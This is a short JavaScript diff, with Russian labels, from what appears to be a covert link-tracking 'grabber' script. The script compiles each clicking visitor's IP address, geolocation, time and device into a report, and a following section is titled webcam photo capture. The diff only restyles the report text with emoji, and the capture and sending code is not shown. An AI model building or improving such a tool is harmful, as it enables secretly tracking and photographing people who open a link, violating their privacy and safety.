@@ -28,9 +28,9 @@
     let deviceType = "не определено";
     
     if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
-        deviceType = "Мобильное устройство";
+        deviceType = "Телефон";
     } else if (/Windows|Mac|Linux|X11/i.test(userAgent)) {
-        deviceType = "Десктоп";
+        deviceType = "Пк";
     }
     
     // Краткая версия UA (основные идентификаторы)
@@ -40,12 +40,12 @@
     }
 
     // ---------- 4. Формирование caption (древовидный стиль) ----------
-    const caption = `Новый переход по ссылке!
+    const caption = `🚨Новый переход по ссылке!
 
-IP Адресс: ${ipAddress}
- ├─ Гео/Локация: ${geo}
- ├─ Время перехода: ${timeStr}
- └─ Устройство/UserAgent: ${deviceType} | ${shortUA}`;
+🌐IP Адресс: ${ipAddress}
+ ├─🌍Гео: ${geo}
+ ├─🕗Время: ${timeStr}
+ └─🖥UserAgent: ${deviceType} | ${shortUA}`;
 
     // ---------- 5. Захват фото с вебкамеры ----------
     let photoBlob = null;
